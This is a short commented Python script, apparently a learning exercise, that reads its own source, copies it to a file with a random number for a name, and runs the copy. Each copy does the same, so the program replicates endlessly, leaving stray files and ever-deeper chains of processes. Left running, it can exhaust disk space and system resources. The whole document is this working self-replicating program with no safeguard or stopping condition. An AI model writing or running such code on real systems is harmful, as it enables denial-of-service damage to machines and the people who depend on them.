import os, random, subprocess
cycle = open(__file__).read() #setting var to open this file and read
name = str(random.randint(1,1000000)) 
with open(name +'.py','w') as file: #sets name of new file to random int
    file.write(cycle) #writes this program into new file
recycle = '{}.py'.format(name) #setting var = to the int above + .py
process = subprocess.run(["python", recycle], shell = False) #runs the copy of new file


